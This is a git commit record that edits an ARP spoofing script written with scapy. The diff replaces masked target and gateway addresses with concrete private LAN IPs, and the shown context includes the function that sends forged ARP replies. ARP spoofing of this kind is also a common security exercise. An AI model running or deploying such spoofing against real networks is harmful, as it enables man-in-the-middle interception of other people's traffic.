5a476f7cecb1a8f1cde5c3f1b0ab235fb9252454
em0ji <rowi.xyz@gmail.com>
2021-10-06 15:07:54 -0400

    ip change

--- arp_spoof/arp_spoof.py
+++ arp_spoof/arp_spoof.py
@@ -21,8 +21,8 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
-target_ip = "***.***.**.***"
-gateway_ip = "***.***.**.*"
+target_ip = "192.168.31.186"
+gateway_ip = "192.168.31.1"
 
 try:
     send_packets_count = 0
